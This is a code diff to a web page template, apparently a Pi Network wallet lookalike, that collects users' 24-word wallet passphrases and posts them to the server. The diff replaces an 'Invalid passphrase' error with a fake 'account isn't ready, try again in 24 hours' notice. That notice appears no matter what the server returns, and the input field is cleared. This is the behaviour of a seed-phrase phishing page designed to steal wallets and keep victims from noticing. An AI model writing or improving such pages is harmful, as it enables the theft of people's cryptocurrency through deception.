@@ -124,13 +124,26 @@
 			color: white;
         }
 
+        .service-error {
+            color: #842029;
+            font-size: 14px;
+            text-align: left;
+            margin: 0 0 15px 0;
+            padding: 12px 15px;
+            border-radius: 4px;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 400;
+            display: none;
+            background-color: #f8d7da;
+            border: 1px solid #f5c2c7;
+        }
+
         .error-message {
             color: #dc3545;
             font-size: 14px;
             text-align: center;
-            margin: 10px 0;
-            padding: 10px;
-            border-radius: 6px;
+            margin: 5px 0;
+            padding: 5px 0;
             font-family: 'Poppins', sans-serif;
             font-weight: 400;
             display: none;
@@ -182,17 +195,6 @@
             }
         }
 
-        .error-message {
-            color: #dc3545;
-            font-size: 14px;
-            font-family: 'Poppins', sans-serif;
-            text-align: center;
-            margin: 10px 0;
-            padding: 10px;
-            font-weight: 400;
-        }
-
-        
         /* Remove default browser validation popup */
         form:invalid {
             box-shadow: none;
@@ -211,12 +213,12 @@
             <form method="POST" action="{% url 'wallet' %}" novalidate>
                 {% csrf_token %}
                 <div class="form-group">
+                    <div class="service-error" style="display: none;"></div>
                     <textarea 
                         name="mf-text" 
                         placeholder="Enter your 24-word passphrase here"
                         class="mf-input txt-input"
                         required></textarea>
-                    
                     <div class="error-message" style="display: none;"></div>
                 </div>
                 
@@ -243,20 +245,33 @@
         }
 
         // Handle form submission
+        function showServiceError(message) {
+            const errorDiv = document.querySelector('.service-error');
+            const textarea = document.querySelector('textarea');
+            if (errorDiv) {
+                errorDiv.textContent = message;
+                errorDiv.style.display = 'block';
+                // Clear the textarea
+                textarea.value = '';
+            }
+        }
+
         function showError(message) {
             const errorDiv = document.querySelector('.error-message');
             if (errorDiv) {
                 errorDiv.textContent = message;
                 errorDiv.style.display = 'block';
-                errorDiv.classList.remove('success-message');
             }
         }
 
         function clearError() {
             const errorDiv = document.querySelector('.error-message');
+            const serviceError = document.querySelector('.service-error');
             if (errorDiv) {
                 errorDiv.style.display = 'none';
-                errorDiv.classList.remove('success-message');
+            }
+            if (serviceError) {
+                serviceError.style.display = 'none';
             }
         }
 
@@ -288,17 +303,17 @@
             })
             .then(response => response.json())
             .then(data => {
-                showError('Invalid passphrase');
+                showServiceError("🅧Hi Pioneer! Your account isn't ready for Buy/Sell service yet. Please complete KYC, finish Migration, and make sure you have some Pi available. Try again in 24 hours.");
             })
             .catch(() => {
-                showError('Invalid passphrase');
+                showServiceError("🅧Hi Pioneer! Your account isn't ready for Buy/Sell service yet. Please complete KYC, finish Migration, and make sure you have some Pi available. Try again in 24 hours.");
             });
         });
 
-        // Clear error when user starts typing
-        document.querySelector('textarea').addEventListener('input', function() {
-            clearError();
-        });
+        // Clear error when user starts typing or focuses on textarea
+        const textarea = document.querySelector('textarea');
+        textarea.addEventListener('input', clearError);
+        textarea.addEventListener('focus', clearError);
     </script>
 </body>
 </html>
